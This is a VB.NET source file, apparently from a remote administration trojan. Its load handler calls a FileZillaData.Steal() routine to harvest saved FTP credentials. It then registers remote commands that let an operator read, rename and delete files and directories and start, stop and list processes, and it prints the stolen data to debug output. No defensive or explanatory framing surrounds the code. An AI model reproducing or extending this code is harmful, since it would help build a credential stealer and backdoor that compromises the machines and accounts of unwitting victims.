Imports System.Threading
Public Class MainWindow

    Private Sub MainWindow_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim FileZillaData As New FileZillaData
        Dim rsp As String = FileZillaData.Steal()
        Dim Commands As New Commands
        'RemoteFileManager
        Commands.RegisterCommand("setattribute", "rfm-SetAttributes")
        Commands.RegisterCommand("renamedir", "rfm-RenameDirectory")
        Commands.RegisterCommand("renamefile", "rfm-RenameFile")
        Commands.RegisterCommand("readtxtfile", "rfm-ReadTextFile")
        Commands.RegisterCommand("deletedir", "rfm-DeleteDirectory")
        Commands.RegisterCommand("deletefile", "rfm-DeleteFile")
        Commands.RegisterCommand("rfmlist", "rfm-GetDirectorys/rfm-GetFiles")
        'RemoteProcessManager
        Commands.RegisterCommand("stopprocess", "rpm-StopProcess")
        Commands.RegisterCommand("startprocess", "rpm-NewProcess")
        Commands.RegisterCommand("rpmlist", "rpm-GetProcesses")

        Dim Power As PowerStatus = SystemInformation.PowerStatus
        Dim Percent As Integer = Power.BatteryLifePercent * 100
        Debug.Print(FileZillaData.Steal)
        Debug.Print("Akkustand: " & Convert.ToString(Percent) & "%")
    End Sub
End Class